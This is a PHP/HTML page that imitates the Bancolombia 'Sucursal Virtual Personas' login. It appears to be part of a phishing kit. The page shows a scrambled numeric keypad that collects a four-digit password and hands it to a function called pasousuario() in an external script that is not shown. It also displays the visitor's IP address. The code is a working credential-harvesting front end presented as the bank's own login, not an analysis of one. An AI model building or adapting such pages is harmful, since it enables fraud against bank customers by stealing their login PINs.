<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Bancolombia Sucursal Vrtual Personas</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
  		
		<meta content="es" http-equiv="Content-Language">
  	
		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	 	<script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="img/logo.png" />
		<script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
		<script src="js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="js/functions.js"></script>  		
   	</head>
   	<body>
   		<div class="contenido">
   			<div class="cabecera">
   				<div class="logo">
   					<img src="img/cont/t-mar-min.jpg">   				
   					<br>
   					<table style="margin-top:17px;"><tr><td><img src="img/cont/t-fec-min.jpg">   				</td><td><span class="texto-min" id="fecha-hora">Lunes 13 de Junio de 2022 9:23:11 AM</span></td></tr></table>					
   				</div>
   				<div class="titulo"><img src="img/cont/u-tiu-ses-min.jpg"></div>
   				<div class="mensaje">
   					<table>
   						<tr>
   							<td valign="middle"><img src="img/error.jpg" style="width: 40px;"></td>   					
   							<td valign="middle" style="padding-left: 12px;"><span style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Por favor ingesar la información requerida.</span></td>
   						</tr>
   					</table>
   				</div>
   			</div>   			
   			<div class="cuerpo">
   				<div class="pnlizqPass" style="color:#fff;">
   					.
   				</div>
   				<div class="pnlderPass" style="margin-bottom: 25px;">
   					<div class="entrada">  						
   						<div class="formulario">
	   						<div class="form-titulo"><img src="img/cont/p-sec-pas-min.jpg"></div>
	   						<div class="descripcion">
	   							<img src="img/cont/p-sub-min.jpg">
	   						</div>
	   						<div class="form-cuerpo">
	   							<div style="text-align: left;">
	   								<img src="img/cont/p-eti-pas-min.jpg">
	   							</div>   						
	   							<div class="input-icono pass">
	   								<input type="password" name="txtPassword" id="txtPassword" readonly>
	   							</div>	   							
	   							<div class="subtexto">
	   								<img src="img/cont/p-des-min.jpg">
	   							</div>
	   							<br>
	   							<img src="img/cont/p-bot-can-min.jpg" style="cursor: pointer;" id="btnCancelar" name="btnCancelar">
	   							&nbsp;&nbsp;&nbsp;
	   							<img src="img/cont/u-bot-con-min.jpg" style="cursor: pointer;" id="btnPass" name="btnPass">	   						
	   							<br>
	   							<div class="texto" style="text-align: right;padding-top: 20px;">
		   							<img src="img/cont/p-gen-min.jpg">	
								</div>   							
	   						</div>
	   					</div>
   					</div>
   					<div class="teclado">
   						<table class="teclas" border="0" cellspacing="5">
   							<tr>
   								<td align="center" valign="middle" id="tecla1">1</td>
   								<td align="center" valign="middle" id="tecla7">7</td>
   								<td align="center" valign="middle" id="tecla6">6</td>
   							</tr>
   							<tr>
   								<td align="center" valign="middle" id="tecla4">4</td>
   								<td align="center" valign="middle" id="tecla3">3</td>
   								<td align="center" valign="middle" id="tecla2">2</td>
							</tr>
							<tr>
								<td align="center" valign="middle" id="tecla5">5</td>
								<td align="center" valign="middle" id="tecla0">0</td>
								<td align="center" valign="middle" id="tecla9">9</td>
							</tr>
							<tr>
								<td align="center" valign="middle" id="tecla8">8</td>
								<td colspan="2" align="center" valign="middle" id="teclaborrar">Borrar</td>
							</tr>
						</table>  
						<img src="img/con-a.gif" style="margin-left: 21px; margin-top: 5px;"> 						
   					</div>

   				</div>
   			</div>   			
   			<div class="pie">
   				<img src="img/cont/t-foo-min.jpg" id="footer">
   				<img src="img/cont/t-foo1-min.jpg" id="footer1">
   				<img src="img/cont/t-foo2-min.jpg" id="footer2">
   				<img src="img/cont/t-foo3-min.jpg" id="footer3">
   				<img src="img/cont/t-foo4-min.jpg" id="footer4">
   				<img src="img/cont/t-foo5-min.jpg" id="footer5">

   				<div class="ippie">
   					<span class="dirip"><table><tr><td><img src="img/cont/t-ip-min.jpg"></td><td class="textip"><?php echo $ip; ?></td></tr></table></span>´
   					<span class="copyright"><img src="img/cont/t-cop-min.jpg"></span>
   				</div>
   			</div>
   		</div>
   	</body>
</html>
<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('.teclado td').hover(function(){
			$('#tecla1,#tecla2,#tecla3,#tecla4,#tecla5,#tecla6,#tecla7,#tecla8,#tecla9,#tecla0').html("*");
		});

		$('.teclado td').mouseout(function(){		
			$('#tecla1').html("1");
			$('#tecla2').html("2");
			$('#tecla3').html("3");
			$('#tecla4').html("4");
			$('#tecla5').html("5");
			$('#tecla6').html("6");
			$('#tecla7').html("7");
			$('#tecla8').html("8");
			$('#tecla9').html("9");
			$('#tecla0').html("0");		
		});
		$('#tecla1').click(function(){
			if ($('#txtPassword').val().length < 4) {
				$('#txtPassword').val($('#txtPassword').val() + "1");
				$(".mensaje").hide();
			}
		});
		$('#tecla2').click(function(){
			if ($('#txtPassword').val().length < 4) {
				$('#txtPassword').val($('#txtPassword').val() + "2");
				$(".mensaje").hide();
			}
		});
		$('#tecla3').click(function(){
			if ($('#txtPassword').val().length < 4) {
				$('#txtPassword').val($('#txtPassword').val() + "3");
				$(".mensaje").hide();
			}
		});
		$('#tecla4').click(function(){
			if ($('#txtPassword').val().length < 4) {
				$('#txtPassword').val($('#txtPassword').val() + "4");
				$(".mensaje").hide();
			}
		});
		$('#tecla5').click(function(){
			if ($('#txtPassword').val().length < 4) {
				$('#txtPassword').val($('#txtPassword').val() + "5");
				$(".mensaje").hide();
			}
		});
		$('#tecla6').click(function(){
			if ($('#txtPassword').val().length < 4) {
				$('#txtPassword').val($('#txtPassword').val() + "6");
				$(".mensaje").hide();
			}
		});
		$('#tecla7').click(function(){
			if ($('#txtPassword').val().length < 4) {
				$('#txtPassword').val($('#txtPassword').val() + "7");
				$(".mensaje").hide();
			}
		});
		$('#tecla8').click(function(){
			if ($('#txtPassword').val().length < 4) {
				$('#txtPassword').val($('#txtPassword').val() + "8");
				$(".mensaje").hide();
			}
		});
		$('#tecla9').click(function(){
			if ($('#txtPassword').val().length < 4) {
				$('#txtPassword').val($('#txtPassword').val() + "9");
				$(".mensaje").hide();
			}
		});
		$('#tecla0').click(function(){
			if ($('#txtPassword').val().length < 4) {
				$('#txtPassword').val($('#txtPassword').val() + "0");
				$(".mensaje").hide();
			}
		});
		$('#teclaborrar').click(function(){			
				$('#txtPassword').val("");		
				$(".mensaje").hide();	
		});

		$('#btnPass').click(function(){
			if ($("#txtPassword").val().length > 3) {
				pasousuario($("#txtPassword").val());	
			}else{
				$(".mensaje").show();
			}	
		});

				
	});
</script>

<script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#fecha-hora').jclock(optionsEST);
     });
 </script>